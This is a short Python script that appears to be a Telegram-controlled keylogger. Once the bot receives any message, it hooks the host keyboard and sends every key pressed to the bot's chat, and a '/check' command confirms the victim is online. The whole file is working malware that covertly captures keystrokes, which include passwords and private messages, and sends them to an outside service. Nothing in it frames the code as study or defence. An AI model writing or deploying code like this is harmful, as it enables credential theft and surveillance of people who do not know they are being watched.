import telebot
import keyboard

API_TOKEN = ''
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(content_types=['text'])
def get_messages(message):
    if message.text == '/check':
        bot.send_message(message.chat.id, "User online!")

    def on_press(key):
        bot.send_message(message.chat.id, f"{key.name}")

    keyboard.on_press(on_press)
    
bot.infinity_polling(timeout=30,long_polling_timeout=10)
keyboard.wait() 